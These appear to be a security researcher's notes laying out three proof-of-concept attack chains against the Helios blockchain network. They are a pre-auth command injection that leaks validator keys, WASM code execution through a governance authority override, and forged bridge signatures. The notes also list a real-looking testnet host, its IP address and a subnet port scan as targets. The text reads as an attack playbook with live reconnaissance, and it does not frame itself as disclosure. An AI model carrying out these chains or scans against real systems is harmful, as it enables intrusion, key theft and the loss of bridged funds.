# Helios Network — 2026-08-13 — PoC Patterns

## PoC 1: Docker Manager Pre-Auth RCE (PROVEN, live execution)

Target: Helios-Docker-Chain-Manager (Node.js Express, port 8080)
Impact: RCE as root, validator key theft

Exploit chain:
1. GET /auth → false (fresh node, no .password file)
2. POST /auth-subscribe {password:"pwned"} → true (set password, PRE-AUTH)
3. POST /execute-db-info {height:"1; cmd"} → command injection via template literal
4. GET /download/priv_validator_key.json → leak validator keys

Key files:
- middlewares.js:65-118 — auth bypass (undefined != undefined = false)
- utils/exec-wrapper.js:4-9 — exec() without sanitization
- exposition/POST-execute-db-info.js — `heliades application-db info --height=${blockHeight}`

Environment: password=undefined on fresh node. Node creates `.password` via automation.js:228 if PASSWORD env var set (docker-compose-x.js: PASSWORD="test").

## PoC 2: WASM RCE via overrideAuthority (CODE PROVEN)

Chain: ModuleExecProposal.Any → UnpackAny (no whitelist) → overrideAuthority (reflect.SetString) → MsgStoreCode with gov privilege → WASM host function RCE

Key files:
- app/generic_proposal_handler.go:31-66 — UnpackAny + overrideAuthority
- wasmd/x/wasm/keeper/keeper.go:168-177 — StoreCode

## PoC 3: Bridge Sig Forge (CODE PROVEN)

Chain: ValidateEthereumSignature NOOP (return nil) → forge MsgValsetConfirm/MsgConfirmBatch → submitBatch on Ethereum with fake checkpoint

Key files:
- x/hyperion/types/ethereum_signer.go:85-97 — ALL code commented, return nil
- x/hyperion/keeper/msg_server_helios.go:157 — EthAddress ignored (CRITICAL-2)
- Ethereum-Bridge-Contract/contracts/Hyperion.sol:275-279 — owner bypass (<10 validators)

## Target Discovery

- testnet1.helioschainlabs.org → 148.251.80.3 (Docker Manager :8080 OPEN, but locked)
- Scan: port 8080, 8545, 26657, 1317, 9090 on subnet
- P2P net_info for peer discovery